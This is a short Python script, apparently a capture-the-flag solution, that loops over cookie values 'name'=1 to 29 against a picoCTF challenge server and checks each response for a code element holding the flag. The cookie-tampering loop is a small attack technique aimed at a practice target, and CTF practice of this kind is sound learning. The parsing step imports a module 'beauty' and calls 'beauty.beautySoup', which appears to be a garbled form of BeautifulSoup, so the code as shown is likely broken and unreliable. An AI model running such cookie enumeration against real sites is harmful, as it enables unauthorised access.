import requests
import beauty

def test(cookies):
    req = requests.get("http://mercury.picoctf.net:29649/check", cookies=cookies)
    text = req.text
    
    html = beauty.beautySoup(text)
    
    div = html.find("code")
    
    if div:
       return [True, div.text]
    else:
       return [False, ""]
    
    
for i in range(1, 30):
    t = test({"name":str(i)})
    print("Test %d"%(i), t[0], t[1])
    if t[0]:
       break
    